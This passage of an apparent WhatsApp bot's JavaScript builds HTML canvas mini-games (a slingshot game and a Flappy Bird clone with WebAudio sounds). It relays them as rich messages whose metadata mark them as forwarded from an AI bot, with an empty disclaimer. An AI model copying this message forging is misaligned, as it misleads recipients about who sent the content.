if(Math.abs(p.vy)<0.5)p.vy=0;
}

if(p.x>W||p.x<0||p.y>H){
projectiles.splice(i,1);
continue;
}

let hit=false;
for(const target of targets){
if(!target.alive)continue;
if(p.x>target.x&&p.x<target.x+target.w&&
p.y>target.y&&p.y<target.y+target.h){
target.hp--;
if(target.hp<=0){
target.alive=false;
score+=10+level*5;
addExplosion(target.x+target.w/2,target.y+target.h/2,'#ff6b6b',20);
addExplosion(target.x+target.w/2,target.y+target.h/2,'#ffd93d',10);
}
addExplosion(p.x,p.y,'#ffd93d',15);
projectiles.splice(i,1);
hit=true;
updateUI();
break;
}
}
if(hit)continue;

if(p.vx===0&&p.vy===0&&p.y+p.r>=groundY-2){
projectiles.splice(i,1);
}
}

for(let i=particles.length-1;i>=0;i--){
const p=particles[i];
p.x+=p.vx;
p.y+=p.vy;
p.vy+=0.05;
p.life--;
if(p.life<=0)particles.splice(i,1);
}

if(projectiles.length===0){
const alive=targets.filter(t=>t.alive).length;
if(alive===0){
level++;
spawnTargets();
birdCount=Math.min(birdCount+2,10);
updateUI();
}else if(birdCount<=0&&projectiles.length===0){
gameOver=true;
}
}

updateUI();
}

function render(){
ctx.clearRect(0,0,W,H);

const sky=ctx.createLinearGradient(0,0,0,H);
sky.addColorStop(0,'#87CEEB');
sky.addColorStop(0.6,'#b8d4e3');
sky.addColorStop(1,'#d4e9f2');
ctx.fillStyle=sky;
ctx.fillRect(0,0,W,H);

for(let x=0;x<W+40;x+=60){
const wx=(x+Date.now()*0.01)%120;
ctx.fillStyle='rgba(255,255,255,0.3)';
ctx.beginPath();
ctx.ellipse(x-40+wx,30+Math.sin(x*0.02+Date.now()*0.001)*10,25,8,0,0,Math.PI*2);
ctx.fill();
}

ctx.fillStyle='#8BC34A';
ctx.fillRect(0,groundY,W,H-groundY);
ctx.fillStyle='#689F38';
ctx.fillRect(0,groundY,W,6);

ctx.fillStyle='#795548';
for(let x=0;x<W+40;x+=30){
ctx.fillRect(x+(Date.now()*0.02)%60,groundY+10,4,8);
}

ctx.fillStyle='#2E7D32';
ctx.fillRect(0,groundY+4,W,4);

for(const target of targets){
if(!target.alive)continue;
const cx=target.x+target.w/2;
const cy=target.y+target.h/2;
if(target.type==='pig'){
ctx.fillStyle='#4CAF50';
ctx.beginPath();
ctx.arc(cx,cy,target.w/2,0,Math.PI*2);
ctx.fill();
ctx.fillStyle='#388E3C';
ctx.beginPath();
ctx.arc(cx-3,cy-3,target.w/4,0,Math.PI*2);
ctx.fill();
ctx.fillStyle='#1B5E20';
ctx.fillRect(cx-2,cy-1,4,2);
ctx.fillStyle='#fff';
ctx.fillRect(cx-4,cy-4,2,2);
ctx.fillRect(cx+2,cy-4,2,2);
ctx.fillStyle='#1B5E20';
ctx.fillRect(cx-3,cy-3,1,1);
ctx.fillRect(cx+2,cy-3,1,1);
ctx.fillStyle='#1B5E20';
ctx.beginPath();
ctx.arc(cx,cy+2,3,0,Math.PI);
ctx.fill();
}else{
ctx.fillStyle='#8D6E63';
ctx.fillRect(target.x,target.y,target.w,target.h);
ctx.fillStyle='#6D4C41';
ctx.fillRect(target.x+2,target.y+2,target.w-4,target.h-4);
ctx.fillStyle='#A1887F';
ctx.fillRect(target.x+4,target.y+4,target.w-8,target.h-8);
}
ctx.fillStyle='rgba(255,255,255,0.3)';
ctx.fillRect(target.x+2,target.y+2,target.w-4,3);

if(target.hp<target.maxHp){
ctx.fillStyle='#e74c3c';
ctx.fillRect(target.x,target.y-6,target.w*(target.hp/target.maxHp),3);
}
}

for(const p of projectiles){
const grad=ctx.createRadialGradient(p.x-3,p.y-3,2,p.x,p.y,p.r);
grad.addColorStop(0,'#ff6b6b');
grad.addColorStop(0.5,'#e74c3c');
grad.addColorStop(1,'#c0392b');
ctx.fillStyle=grad;
ctx.beginPath();
ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
ctx.fill();
ctx.fillStyle='#fff';
ctx.beginPath();
ctx.arc(p.x-3,p.y-4,3,0,Math.PI*2);
ctx.fill();
ctx.fillStyle='#1a1a1a';
ctx.beginPath();
ctx.arc(p.x-4,p.y-5,1.5,0,Math.PI*2);
ctx.fill();
ctx.fillStyle='#f39c12';
ctx.beginPath();
ctx.moveTo(p.x+6,p.y-2);
ctx.lineTo(p.x+12,p.y-4);
ctx.lineTo(p.x+10,p.y+2);
ctx.closePath();
ctx.fill();
}

for(const p of particles){
const alpha=p.life/p.maxLife;
ctx.globalAlpha=alpha;
ctx.fillStyle=p.color;
ctx.beginPath();
ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
ctx.fill();
ctx.globalAlpha=1;
}

ctx.fillStyle='#e52521';
ctx.beginPath();
ctx.arc(birdX,birdY,14,0,Math.PI*2);
ctx.fill();
ctx.fillStyle='#c0392b';
ctx.beginPath();
ctx.arc(birdX-2,birdY-2,8,0,Math.PI*2);
ctx.fill();
ctx.fillStyle='#fff';
ctx.beginPath();
ctx.arc(birdX-4,birdY-4,3,0,Math.PI*2);
ctx.fill();
ctx.fillStyle='#1a1a1a';
ctx.beginPath();
ctx.arc(birdX-5,birdY-5,1.5,0,Math.PI*2);
ctx.fill();
ctx.fillStyle='#f39c12';
ctx.beginPath();
ctx.moveTo(birdX+8,birdY-3);
ctx.lineTo(birdX+16,birdY-6);
ctx.lineTo(birdX+14,birdY+1);
ctx.closePath();
ctx.fill();
ctx.fillStyle='#f5cba7';
ctx.fillRect(birdX-2,birdY+4,4,3);

ctx.fillStyle='rgba(255,255,255,0.2)';
ctx.fillRect(10,10,120,18);
ctx.fillStyle='#fff';
ctx.font='11px sans-serif';
ctx.fillText('Power: '+Math.round(power)+'%',16,24);

ctx.fillStyle='rgba(0,0,0,0.3)';
ctx.fillRect(12,30,100,6);
const grad2=ctx.createLinearGradient(12,0,112,0);
grad2.addColorStop(0,'#e74c3c');
grad2.addColorStop(0.5,'#f39c12');
grad2.addColorStop(1,'#2ecc71');
ctx.fillStyle=grad2;
ctx.fillRect(12,30,power,6);

if(gameOver){
ctx.fillStyle='rgba(0,0,0,0.6)';
ctx.fillRect(0,0,W,H);
ctx.fillStyle='#e74c3c';
ctx.font='bold 28px sans-serif';
ctx.textAlign='center';ctx.textBaseline='middle';
ctx.fillText('💀 GAME OVER',W/2,H/2-20);
ctx.fillStyle='#fff';
ctx.font='16px sans-serif';
ctx.fillText('Skor: '+score+' | Level: '+level,W/2,H/2+25);
ctx.fillStyle='var(--muted)';
ctx.font='13px sans-serif';
ctx.fillText('Klik 🔄 Ulang untuk main lagi',W/2,H/2+65);
}

if(birdCount<=0&&projectiles.length===0&&!gameOver){
ctx.fillStyle='rgba(0,0,0,0.4)';
ctx.fillRect(0,0,W,H);
ctx.fillStyle='#fff';
ctx.font='bold 22px sans-serif';
ctx.textAlign='center';ctx.textBaseline='middle';
ctx.fillText('🔄 Burung habis!',W/2,H/2-10);
ctx.fillStyle='var(--muted)';
ctx.font='14px sans-serif';
ctx.fillText('Klik 🔄 Ulang',W/2,H/2+30);
}

document.getElementById('score-display').textContent=score;
document.getElementById('birds-display').textContent=birdCount;
document.getElementById('targets-display').textContent=targets.filter(t=>t.alive).length;
}

function gameLoop(){
update();
render();
requestAnimationFrame(gameLoop);
}

canvas.addEventListener('click',(e)=>{
if(gameOver)return;
const rect=canvas.getBoundingClientRect();
const scaleX=canvas.width/rect.width;
const scaleY=canvas.height/rect.height;
const x=(e.clientX-rect.left)*scaleX;
const y=(e.clientY-rect.top)*scaleY;
if(x>birdX+30){
const dist=Math.sqrt((x-birdX)**2+(y-birdY)**2);
const pwr=Math.min(100,dist/3);
power=pwr;
}
});

document.getElementById('btn-shoot').addEventListener('click',()=>{
if(gameOver)return;
const pwr=power;
shootWithPower(pwr);
power=Math.max(10,power-10);
});

document.getElementById('btn-power').addEventListener('click',()=>{
power=Math.min(100,power+10);
});

document.getElementById('btn-reset').addEventListener('click',resetGame);

resizeCanvas();
resetGame();
window.addEventListener('resize',()=>{resizeCanvas();});
gameLoop();
\n/* RIMURU LIGHT SFX: procedural WebAudio, no external audio asset */
(function(){
  if (window.__RIMURU_LIGHT_SFX__) return;
  var ac=null, master=null, last=0;
  function init(){
    try{
      if(!ac){
        var C=window.AudioContext||window.webkitAudioContext;
        if(!C) return null;
        ac=new C();
        master=ac.createGain();
        master.gain.value=0.055;
        master.connect(ac.destination);
      }
      if(ac.state==='suspended') ac.resume();
      return ac;
    }catch(_){ return null; }
  }
  function tone(freq,dur,type,vol,when){
    var c=init(); if(!c||!master) return;
    var now=c.currentTime+(when||0), o=c.createOscillator(), g=c.createGain();
    o.type=type||'sine';
    o.frequency.setValueAtTime(freq,now);
    g.gain.setValueAtTime(0.0001,now);
    g.gain.exponentialRampToValueAtTime(Math.max(0.0001,vol||0.12),now+0.008);
    g.gain.exponentialRampToValueAtTime(0.0001,now+(dur||0.07));
    o.connect(g); g.connect(master); o.start(now); o.stop(now+(dur||0.07)+0.015);
  }
  function cool(now){
    var t=Date.now(); if(t-last<now) return false; last=t; return true;
  }
  var api={
    init:init,
    tap:function(){ if(cool(28)) tone(520,0.045,'square',0.055); },
    move:function(){ if(cool(24)) tone(300,0.035,'triangle',0.045); },
    rotate:function(){ if(cool(24)) tone(430,0.05,'triangle',0.05); },
    drop:function(){ if(cool(20)) tone(180,0.055,'square',0.05); },
    score:function(){ if(cool(18)) { tone(660,0.055,'sine',0.055); tone(880,0.055,'sine',0.04,0.045); } },
    line:function(){ if(cool(35)) { tone(740,0.06,'sine',0.06); tone(1040,0.09,'sine',0.045,0.05); } },
    win:function(){ if(cool(60)) { tone(523,0.08,'sine',0.06); tone(659,0.08,'sine',0.05,0.07); tone(784,0.12,'sine',0.045,0.14); } },
    over:function(){ if(cool(60)) { tone(392,0.09,'sawtooth',0.055); tone(294,0.12,'sawtooth',0.04,0.08); } }
  };
  window.__RIMURU_LIGHT_SFX__=api;

  function num(el){
    var s=(el.textContent||'').replace(/,/g,'').match(/-?\d+(?:\.\d+)?/);
    return s?Number(s[0]):null;
  }
  function bindValue(el){
    var lastVal=num(el);
    var mo=new MutationObserver(function(){
      var n=num(el);
      if(n===null || lastVal===null){ lastVal=n; return; }
      if(n>lastVal){
        var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
        if(/line|combo|clear|level|stage/.test(id)) api.line(); else api.score();
      } else if(n<lastVal && /life|hp|health|lives|heart/.test(((el.id||'')+' '+(el.className||'')).toLowerCase())) api.over();
      lastVal=n;
    });
    mo.observe(el,{subtree:true,childList:true,characterData:true});
  }
  function bindState(el){
    var prev=(el.textContent||'').toLowerCase(), prevCls=el.className||'';
    var mo=new MutationObserver(function(){
      var txt=(el.textContent||'').toLowerCase(), cls=el.className||'';
      var joined=txt+' '+cls.toLowerCase();
      if(joined!==prev+' '+prevCls.toLowerCase()){
        if(/game over|gameover|kalah|selesai|you lose|lose|mati|gagal|over/.test(joined)) api.over();
        else if(/menang|menang!|you win|winner|victory|berhasil|selamat/.test(joined)) api.win();
        prev=txt; prevCls=cls;
      }
    });
    mo.observe(el,{subtree:true,childList:true,characterData:true,attributes:true,attributeFilter:['class','style','hidden','aria-hidden']});
  }
  document.addEventListener('pointerdown',function(){ api.init(); api.tap(); },{passive:true,capture:true});
  document.addEventListener('keydown',function(e){
    api.init();
    var k=e.key;
    if(/^Arrow(Left|Right|Up|Down)$/.test(k) || /^(a|d|w|s)$/i.test(k)) api.move();
    else if(k===' ' || k==='Enter') api.tap();
  },{passive:true,capture:true});
  document.addEventListener('DOMContentLoaded',function(){
    document.querySelectorAll('[id]').forEach(function(el){
      var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
      if(/score|points|lines|combo|level|stage|best|coin/.test(id)) bindValue(el);
      if(/over|result|status|message|state|win|lose|modal/.test(id)) bindState(el);
    });
  });
  if(document.readyState!=='loading'){
    document.querySelectorAll('[id]').forEach(function(el){
      var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
      if(/score|points|lines|combo|level|stage|best|coin/.test(id)) bindValue(el);
      if(/over|result|status|message|state|win|lose|modal/.test(id)) bindState(el);
    });
  }
})();
<\/script>`


const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: html,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
);
}
break

case "flappy": { 
const html = `<style>
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent;-webkit-user-select:none;user-select:none;}
html,body{margin:0;padding:0;width:100%;overflow:hidden;background:transparent;font-family:Arial,sans-serif;touch-action:none;}
.flappyWrap{width:100%;padding:6px;margin:0;overflow:hidden;border:2px solid rgba(255,255,255,.7);border-radius:18px;background:linear-gradient(145deg,#58b9e8,#2386bd);box-shadow:0 0 0 1px rgba(0,0,0,.12),0 4px 15px rgba(0,0,0,.22),inset 0 1px 0 rgba(255,255,255,.4);}
.flappyHeader{height:42px;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;border:1px solid rgba(255,255,255,.45);border-radius:13px 13px 9px 9px;margin-bottom:5px;background:linear-gradient(180deg,#69c8f1,#3297ca);box-shadow:inset 0 1px 0 rgba(255,255,255,.3),0 2px 5px rgba(0,0,0,.15);}
.flappyHeaderTitle{color:#fff;font:bold 22px Arial,sans-serif;letter-spacing:2px;text-shadow:0 2px 0 #17658d,0 3px 5px rgba(0,0,0,.35);}
.flappyHeaderTitle span{color:#ffd447;}
.flappyHeaderBird{position:absolute;font-size:19px;text-shadow:0 2px 2px rgba(0,0,0,.25);}
.flappyHeaderBird.left{left:12px;}
.flappyHeaderBird.right{right:12px;transform:scaleX(-1);}
.flappyGame{position:relative;width:100%;height:210px;overflow:hidden;border:2px solid rgba(255,255,255,.75);border-radius:14px;background:#8fd8ff;box-shadow:inset 0 1px 0 rgba(255,255,255,.35),0 2px 7px rgba(0,0,0,.2);}
#flappyCanvas{display:block;width:100%;height:100%;}
.flappyScore{position:absolute;top:9px;left:0;right:0;z-index:5;text-align:center;color:#fff;font:bold 25px Arial,sans-serif;text-shadow:0 2px 3px rgba(0,0,0,.3);pointer-events:none;}
.flappyBest{position:absolute;top:39px;left:0;right:0;z-index:5;text-align:center;color:rgba(255,255,255,.95);font:bold 10px monospace;text-shadow:0 1px 2px rgba(0,0,0,.3);pointer-events:none;}
.flappyStart{position:absolute;inset:0;z-index:10;display:flex;align-items:center;justify-content:center;flex-direction:column;background:rgba(72,177,224,.18);}
.flappyStart.hide{display:none;}
.flappyTitle{color:#fff;font:bold 25px Arial,sans-serif;text-shadow:0 2px 4px rgba(0,0,0,.35);margin-bottom:7px;}
.flappyText{color:#fff;font:bold 11px monospace;text-shadow:0 1px 3px rgba(0,0,0,.4);}
.flappyOver{position:absolute;inset:0;z-index:20;display:none;align-items:center;justify-content:center;flex-direction:column;background:rgba(24,74,100,.48);}
.flappyOver.show{display:flex;}
.flappyOverTitle{color:#fff;font:bold 22px Arial,sans-serif;text-shadow:0 2px 4px rgba(0,0,0,.5);margin-bottom:5px;}
.flappyFinal{color:#fff;font:bold 12px monospace;text-shadow:0 1px 3px rgba(0,0,0,.5);}
.flappyRestart{margin-top:10px;padding:7px 17px;border:1px solid rgba(0,0,0,.08);border-radius:7px;background:#fff;color:#4b9ac4;font:bold 11px Arial,sans-serif;box-shadow:0 2px 5px rgba(0,0,0,.15);}
.flappyHint{position:absolute;z-index:4;bottom:6px;left:0;right:0;text-align:center;color:rgba(255,255,255,.78);font:bold 9px monospace;text-shadow:0 1px 2px rgba(0,0,0,.25);pointer-events:none;}
.flappyFooter{height:34px;display:flex;align-items:center;justify-content:space-between;gap:6px;margin-top:5px;padding:0 9px;border:1px solid rgba(255,255,255,.42);border-radius:9px;background:rgba(24,111,157,.55);box-shadow:inset 0 1px 0 rgba(255,255,255,.2);}
.flappySound{color:#fff;font-size:17px;text-shadow:0 2px 3px rgba(0,0,0,.3);}
.flappyFooterText{color:#fff;font:bold 9px monospace;text-shadow:0 1px 2px rgba(0,0,0,.3);}
.flappyFooterBest{color:#ffe66a;font:bold 10px monospace;text-shadow:0 1px 2px rgba(0,0,0,.3);}
</style>
<div class="flappyWrap">
<div class="flappyHeader">
<div class="flappyHeaderBird left">🐤</div>
<div class="flappyHeaderTitle">FLAPPY <span>BIRD</span></div>
<div class="flappyHeaderBird right">🐤</div>
</div>
<div class="flappyGame" id="flappyGame">
<div class="flappyScore" id="flappyScore">0</div>
<div class="flappyBest">BEST <span id="flappyBestValue">0</span></div>
<canvas id="flappyCanvas"></canvas>
<div class="flappyHint">TAP / SPACE TO FLY</div>
<div class="flappyStart" id="flappyStart">
<div class="flappyTitle">FLAPPY BIRD</div>
<div class="flappyText">TAP TO START</div>
</div>
<div class="flappyOver" id="flappyOver">
<div class="flappyOverTitle">GAME OVER</div>
<div class="flappyFinal">SCORE <span id="flappyFinalScore">0</span></div>
<button class="flappyRestart" id="flappyRestart">PLAY AGAIN</button>
</div>
</div>
<div class="flappyFooter">
<div class="flappySound">🔊</div>
<div class="flappyFooterText">TAP TO FLY</div>
<div class="flappyFooterBest">BEST <span id="flappyFooterBest">0</span></div>
</div>
</div>
<script>
(function(){
const canvas=document.getElementById('flappyCanvas'); const ctx=canvas.getContext('2d'); const game=document.getElementById('flappyGame');
const scoreEl=document.getElementById('flappyScore'); const bestEl=document.getElementById('flappyBestValue'); const footerBestEl=document.getElementById('flappyFooterBest');
const startEl=document.getElementById('flappyStart'); const overEl=document.getElementById('flappyOver'); const finalEl=document.getElementById('flappyFinalScore'); const restartEl=document.getElementById('flappyRestart');
let W=0, H=0, DPR=1, running=false, gameOver=false, score=0, best=0, speed=2.7, last=0, spawnTimer=0, frame=0;
let pipes=[], clouds=[], particles=[], audioCtx=null;
const groundHeight=22, bird={x:0, y:0, w:30, h:24, vy:0, rotation:0, wing:0};
try{ best=parseInt(localStorage.getItem('flappy_bird_best')||'0'); if(!Number.isFinite(best)) best=0; }catch(e){ best=0; }
function initAudio(){ if(!audioCtx){ const AC=window.AudioContext||window.webkitAudioContext; if(!AC) return; audioCtx=new AC(); } if(audioCtx.state==='suspended') audioCtx.resume(); }
function playFlapSound(){ initAudio(); if(!audioCtx) return; const now=audioCtx.currentTime; const osc=audioCtx.createOscillator(); const gain=audioCtx.createGain(); osc.type='square'; osc.frequency.setValueAtTime(520,now); osc.frequency.exponentialRampToValueAtTime(760,now+.07); gain.gain.setValueAtTime(.0001,now); gain.gain.exponentialRampToValueAtTime(.07,now+.008); gain.gain.exponentialRampToValueAtTime(.0001,now+.075); osc.connect(gain); gain.connect(audioCtx.destination); osc.start(now); osc.stop(now+.08); }
function playGameOverSound(){ initAudio(); if(!audioCtx) return; const now=audioCtx.currentTime; const osc=audioCtx.createOscillator(); const gain=audioCtx.createGain(); osc.type='sawtooth'; osc.frequency.setValueAtTime(420,now); osc.frequency.exponentialRampToValueAtTime(110,now+.42); gain.gain.setValueAtTime(.0001,now); gain.gain.exponentialRampToValueAtTime(.12,now+.015); gain.gain.exponentialRampToValueAtTime(.0001,now+.45); osc.connect(gain); gain.connect(audioCtx.destination); osc.start(now); osc.stop(now+.46); }
function playScoreSound(){ initAudio(); if(!audioCtx) return; const now=audioCtx.currentTime; const osc=audioCtx.createOscillator(); const gain=audioCtx.createGain(); osc.type='sine'; osc.frequency.setValueAtTime(760,now); osc.frequency.exponentialRampToValueAtTime(1080,now+.09); gain.gain.setValueAtTime(.0001,now); gain.gain.exponentialRampToValueAtTime(.055,now+.01); gain.gain.exponentialRampToValueAtTime(.0001,now+.11); osc.connect(gain); gain.connect(audioCtx.destination); osc.start(now); osc.stop(now+.12); }
function resize(){ const r=game.getBoundingClientRect(); W=r.width; H=r.height; DPR=Math.min(window.devicePixelRatio||1,2); canvas.width=Math.floor(W*DPR); canvas.height=Math.floor(H*DPR); canvas.style.width=W+'px'; canvas.style.height=H+'px'; ctx.setTransform(DPR,0,0,DPR,0,0); bird.x=W*.22; if(!running) bird.y=H*.45; draw(); }
function makeCloud(x,y,w,speed){ return{x:x, y:y, w:w, h:w*.42, speed:speed, alpha:.72+Math.random()*.16}; }
function resetClouds(){ clouds=[makeCloud(W*.08,25,55,.20), makeCloud(W*.48,55,70,.14), makeCloud(W*.86,22,50,.22)]; }
function reset(){ score=0; speed=2.7; spawnTimer=65; frame=0; pipes=[]; particles=[]; resetClouds(); bird.x=W*.22; bird.y=H*.45; bird.vy=0; bird.rotation=0; bird.wing=0; gameOver=false; running=true; startEl.classList.add('hide'); overEl.classList.remove('show'); updateUI(); last=performance.now(); requestAnimationFrame(loop); }
function updateUI(){ const currentScore=Math.floor(score); scoreEl.textContent=String(currentScore); bestEl.textContent=String(Math.floor(best)); footerBestEl.textContent=String(Math.floor(best)); }
function flap(){ initAudio(); if(!running || gameOver){ reset(); playFlapSound(); return; } bird.vy=-7.4; playFlapSound(); createParticles(bird.x-2,bird.y+12,5); }
function createParticles(px,py,count){ for(let i=0; i<count; i++){ particles.push({x:px, y:py, vx:-Math.random()*1.5, vy:(Math.random()-.5)*1.8, life:1, size:1+Math.random()*2}); } }
function createPipe(){ const playableTop=35; const playableBottom=H-groundHeight-18; const gap=Math.max(72,88-score*.12); const minTop=playableTop+18; const maxTop=playableBottom-gap-18; const topHeight=minTop+Math.random()*Math.max(10,maxTop-minTop); pipes.push({x:W+18, w:34, top:topHeight, gap:gap, passed:false}); }
function hit(a,b){ return(a.x<b.x+b.w && a.x+a.w>b.x && a.y<b.y+b.h && a.y+a.h>b.y); }
function pipeCollision(p){ const birdBox={x:bird.x+5, y:bird.y+4, w:bird.w-9, h:bird.h-7}; const bottomY=p.top+p.gap; const topPipe={x:p.x, y:0, w:p.w, h:p.top}; const bottomPipe={x:p.x, y:bottomY, w:p.w, h:H-groundHeight-bottomY}; return(hit(birdBox,topPipe) || hit(birdBox,bottomPipe)); }
function drawSky(){ const gradient=ctx.createLinearGradient(0,0,0,H); gradient.addColorStop(0,'#79cdf4'); gradient.addColorStop(.55,'#9fdef7'); gradient.addColorStop(1,'#c9f0ff'); ctx.fillStyle=gradient; ctx.fillRect(0,0,W,H); }
function drawCloud(c){ const x=c.x, y=c.y, w=c.w, h=c.h; ctx.save(); ctx.globalAlpha=c.alpha; ctx.fillStyle='#fff'; ctx.shadowColor='rgba(80,160,190,.12)'; ctx.shadowBlur=5; ctx.shadowOffsetY=2; ctx.beginPath(); ctx.moveTo(x+w*.10,y+h*.66); ctx.bezierCurveTo(x+w*.02,y+h*.54,x+w*.07,y+h*.30,x+w*.27,y+h*.31); ctx.bezierCurveTo(x+w*.30,y+h*.06,x+w*.45,y,x+w*.56,y+h*.10); ctx.bezierCurveTo(x+w*.67,y+h*.05,x+w*.78,y+h*.17,x+w*.78,y+h*.34); ctx.bezierCurveTo(x+w*.96,y+h*.30,x+w,y+h*.48,x+w*.94,y+h*.63); ctx.bezierCurveTo(x+w*.91,y+h*.75,x+w*.76,y+h*.76,x+w*.62,y+h*.76); ctx.lineTo(x+w*.22,y+h*.76); ctx.bezierCurveTo(x+w*.12,y+h*.76,x+w*.07,y+h*.72,x+w*.10,y+h*.66); ctx.closePath(); ctx.fill(); ctx.restore(); }
function drawPipe(p){ const x=p.x, w=p.w, bottomY=p.top+p.gap; ctx.fillStyle='rgba(0,0,0,.12)'; ctx.fillRect(x+2,0,w,p.top); ctx.fillRect(x+2,bottomY,w,H-groundHeight-bottomY); const gradient=ctx.createLinearGradient(x,0,x+w,0); gradient.addColorStop(0,'#2f9e55'); gradient.addColorStop(.45,'#64c96d'); gradient.addColorStop(1,'#247b46'); ctx.fillStyle=gradient; ctx.fillRect(x,0,w,p.top); ctx.fillRect(x,bottomY,w,H-groundHeight-bottomY); ctx.fillStyle='#3da95a'; ctx.fillRect(x-4,p.top-10,w+8,10); ctx.fillRect(x-4,bottomY,w+8,10); ctx.fillStyle='rgba(255,255,255,.2)'; ctx.fillRect(x+5,0,4,Math.max(0,p.top-4)); ctx.fillRect(x+5,bottomY+10,4,Math.max(0,H-groundHeight-bottomY-10)); }
function drawBird(){ const bx=bird.x, by=bird.y; ctx.save(); ctx.translate(bx+bird.w/2,by+bird.h/2); ctx.rotate(bird.rotation); ctx.fillStyle='#e7a72f'; ctx.beginPath(); ctx.moveTo(-14,-2); ctx.lineTo(-23,-8); ctx.lineTo(-19,3); ctx.lineTo(-24,8); ctx.lineTo(-13,6); ctx.fill(); ctx.fillStyle='#ffd447'; ctx.beginPath(); ctx.ellipse(0,1,15,11,0,0,Math.PI*2); ctx.fill(); ctx.fillStyle='#ffe99b'; ctx.beginPath(); ctx.ellipse(3,5,9,6,0,0,Math.PI*2); ctx.fill(); const wingY=Math.sin(bird.wing)*4; ctx.fillStyle='#eab02e'; ctx.beginPath(); ctx.ellipse(-2,5+wingY*.25,9,5,-.25,0,Math.PI*2); ctx.fill(); ctx.fillStyle='#ffd447'; ctx.beginPath(); ctx.arc(9,-5,10,0,Math.PI*2); ctx.fill(); ctx.fillStyle='#fff'; ctx.beginPath(); ctx.arc(13,-8,4,0,Math.PI*2); ctx.fill(); ctx.fillStyle='#252525'; ctx.beginPath(); ctx.arc(14,-8,2,0,Math.PI*2); ctx.fill(); ctx.fillStyle='#f08a24'; ctx.beginPath(); ctx.moveTo(17,-3); ctx.lineTo(28,1); ctx.lineTo(17,5); ctx.closePath(); ctx.fill(); ctx.strokeStyle='#c96a1a'; ctx.lineWidth=1; ctx.beginPath(); ctx.moveTo(18,1); ctx.lineTo(27,1); ctx.stroke(); ctx.restore(); }
function drawGround(){ const gy=H-groundHeight; ctx.fillStyle='#7fcf57'; ctx.fillRect(0,gy,W,5); ctx.fillStyle='#d6b45c'; ctx.fillRect(0,gy+5,W,groundHeight-5); const offset=-(frame*speed)%24; for(let x=offset; x<W; x+=24){ ctx.fillStyle='#b99346'; ctx.fillRect(x,gy+10,13,2); ctx.fillRect(x+8,gy+17,8,2); } }
function drawParticles(){ particles.forEach(p=>{ ctx.fillStyle='rgba(255,255,255,'+Math.max(0,p.life)+')'; ctx.fillRect(p.x,p.y,p.size,p.size); }); }
function draw(){ if(!W||!H) return; ctx.clearRect(0,0,W,H); drawSky(); clouds.forEach(function(c){drawCloud(c)}); pipes.forEach(function(p){drawPipe(p)}); drawGround(); drawBird(); drawParticles(); }
function finish(){ if(gameOver) return; gameOver=true; running=false; playGameOverSound(); if(Math.floor(score)>best){ best=Math.floor(score); try{ localStorage.setItem('flappy_bird_best',String(best)); }catch(e){} } finalEl.textContent=String(Math.floor(score)); overEl.classList.add('show'); updateUI(); }
function update(dt){ if(gameOver) return; frame++; bird.wing+=dt*.35; bird.vy+=.42*dt; bird.y+=bird.vy*dt; bird.rotation=Math.max(-.45,Math.min(1.15,bird.vy*.055)); if(bird.y<0){ bird.y=0; bird.vy=0; } if(bird.y+bird.h>=H-groundHeight){ bird.y=H-groundHeight-bird.h; finish(); return; } spawnTimer-=dt; if(spawnTimer<=0){ createPipe(); spawnTimer=72+Math.random()*22; } pipes.forEach(function(p){ p.x-=speed*dt; if(!p.passed && p.x+p.w<bird.x){ p.passed=true; score++; playScoreSound(); createParticles(bird.x,bird.y,8); } if(pipeCollision(p)){ finish(); } }); pipes=pipes.filter(function(p){return p.x>-55}); clouds.forEach(function(c){ c.x-=c.speed*dt; if(c.x+c.w<-20){ c.w=42+Math.random()*38; c.h=c.w*.42; c.x=W+20+Math.random()*90; c.y=18+Math.random()*65; c.speed=.12+Math.random()*.13; c.alpha=.72+Math.random()*.16; } }); particles.forEach(function(p){ p.x+=p.vx*dt; p.y+=p.vy*dt; p.life-=.045*dt; }); particles=particles.filter(function(p){return p.life>0}); speed+=.0008*dt; if(speed>4.4) speed=4.4; updateUI(); }
function loop(t){ if(!running) return; if(!last) last=t; const dt=Math.min((t-last)/16.67,2); last=t; update(dt); draw(); if(running) requestAnimationFrame(loop); }
canvas.addEventListener('pointerdown',function(e){ e.preventDefault(); flap(); });
startEl.addEventListener('pointerdown',function(e){ e.preventDefault(); initAudio(); reset(); playFlapSound(); });
restartEl.addEventListener('pointerdown',function(e){ e.preventDefault(); initAudio(); reset(); playFlapSound(); });
document.addEventListener('keydown',function(e){ if(e.code==='Space' || e.code==='ArrowUp'){ e.preventDefault(); flap(); } });
window.addEventListener('resize',resize);
resize();
})();
</script>`


const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
